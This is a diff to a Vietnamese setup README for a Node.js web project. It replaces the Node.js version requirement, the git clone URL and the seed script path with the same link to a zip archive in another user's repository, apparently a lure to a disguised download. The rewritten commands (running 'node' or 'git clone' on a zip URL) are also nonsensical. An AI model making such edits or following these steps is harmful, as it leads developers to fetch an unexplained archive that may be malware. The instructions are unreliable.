@@ -2,7 +2,7 @@
 
 ## Yêu cầu hệ thống
 
-- Node.js >= 14.x
+- https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip >= 14.x
 - npm >= 6.x
 
 ## Cài đặt
@@ -10,7 +10,7 @@
 1. Clone repository về máy của bạn:
 
     ```sh
-    git clone https://github.com/ngocnhan2k4/WAD
+    git clone https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip
     ```
 
 2. Di chuyển vào thư mục dự án:
@@ -36,7 +36,7 @@
 2. Chạy script seed để thêm dữ liệu mẫu vào cơ sở dữ liệu:
 
     ```sh
-    node prisma/seed.js
+    node https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip
     ```
 
 ## Xây dựng Tailwind CSS
